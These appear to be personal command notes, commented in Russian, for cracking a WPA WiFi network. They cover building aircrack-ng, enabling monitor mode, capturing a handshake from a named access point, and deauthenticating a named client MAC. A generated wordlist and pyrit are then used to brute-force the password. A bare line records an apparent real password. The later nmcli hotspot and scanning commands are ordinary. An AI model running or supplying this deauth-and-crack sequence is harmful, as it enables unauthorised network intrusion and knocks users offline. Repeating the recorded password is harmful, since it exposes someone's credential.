git clone http://github.com/aircrack-ng/aircrack-ng
env NOCONFIGURE=1 ./autogen.sh
./configure
make
sudo make install

# убить все процессы которые могу помешать остановить монитори wifi трафик
sudo airmon-ng check kill
# Запустите беспроводной интерфейс в режиме мониторинга:
sudo airmon-ng start wlo1
# Перехват рукопожатия
sudo airodump-ng wlo1mon

iw dev wlo0mon del
sudo airmon-ng start wlo1mon
# Мониторить сеть
sudo airodump-ng -c 5 --bssid B0:BE:76:09:3F:B0 -w WPAcrack wlo1mon --ignore-negative-one
# Деаунтификация клиента
sudo aireplay-ng --deauth 100 -a B0:BE:76:09:3F:B0 -c 20:82:C0:E6:51:29 wlo1mon --ignore-negative-one

# нализируем файл на наличе хендшейков
pyrit -r WPAcrack-06.cap analyze
# Генерируем пароль
crunch 3 7 abcd -o dict.txt
# Подбираем пароль для хендшейка
pyrit --all-handshakes -r WPAcrack-06.cap -i dict.txt attack_passthrough

# посмотреть видит ли GPU
pyrit list_cores

pyrit benchmark

password: Unz7ipd*

# hotspot раздать wifi https://github.com/google/link022
# https://askubuntu.com/questions/490950/create-wifi-hotspot-on-ubuntu
nmcli device wifi hotspot con-name my-hotspot ssid my-hotspot band bg password jesuisunmotdepasse
nmcli connection down my-hotspot

# Create a connection
nmcli connection add type wifi ifname '*' con-name my-hotspot autoconnect no ssid my-local-hotspot
# Put it in Access Point
nmcli connection modify my-hotspot 802-11-wireless.mode ap 802-11-wireless.band bg ipv4.method shared
# Set a WPA password (you should change it)
nmcli connection modify my-hotspot 802-11-wireless-security.key-mgmt wpa-psk 802-11-wireless-security.psk myhardpassword
# Enable it (run this command each time you want to enable the access point)
nmcli connection up my-hotspot

# show current wifi
nmcli dev wifi
nmcli -f ALL dev wifi

IN-USE  SSID              MODE   CHAN  RATE        SIGNAL  BARS  SECURITY 
*       WIFI_name Infra  149   405 Mbit/s  66      ▂▄▆_  WPA2     

# scan wifi
sudo iwlist wlo1 scan | grep ESSID
